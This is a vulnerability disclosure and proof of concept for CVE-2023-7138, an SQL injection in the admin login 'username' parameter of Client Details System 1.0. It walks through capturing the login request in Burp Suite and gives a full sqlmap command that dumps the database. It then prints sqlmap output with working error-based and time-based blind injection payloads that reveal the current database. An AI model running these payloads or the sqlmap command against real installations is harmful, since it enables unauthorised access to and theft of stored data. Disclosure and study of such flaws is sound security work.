# CVE-2023-7138_Client_Details_System-SQL_Injection_2
+ **Exploit Title:** CVE-2023-7138_Client_Details_System-SQL_Injection_2
+ **Date:** 2023-26-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/client-details-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/CLIENT_DETAILS_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7138

## References: 
+ **CVE-2023-7138:** https://vuldb.com/?id.249141
+ https://www.cve.org/CVERecord?id=CVE-2023-7138

## Description:
Client Details System 1.0 allows SQL Injection via parameter 'username' in "/clientdetails/admin". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the Admin Panel: "http://localhost/clientdetails/admin/"
+ Fill User Id and Password.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
POST /clientdetails/admin/ HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 313
Content-Type: application/x-www-form-urlencoded
Referer: http://localhost/clientdetails/admin/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

username=admin&login=&password=P@ssw0rd
```

+ Use sqlmap to exploit. In sqlmap, use 'username' parameter to dump the database. 
```
python sqlmap.py -r r.txt -p username --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 6680 FROM(SELECT COUNT(*),CONCAT(0x7162716271,(SELECT (ELT(6680=6680,1))),0x716b767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zYzR&login=&password=P@ssw0rd

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7749 FROM (SELECT(SLEEP(5)))ysnA)-- MdSB&login=&password=P@ssw0rd
---
[15:08:19] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.1.6, Apache 2.4.53
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[15:08:20] [INFO] fetching current database
[15:08:20] [INFO] retrieved: 'loginsystem'
current database: 'loginsystem'
```

+ current database: `loginsystem`
![2](https://github.com/h4md153v63n/CVEs/assets/5091265/8fcb4ea7-ff09-4ea1-b8e7-5730ce9a41a8)
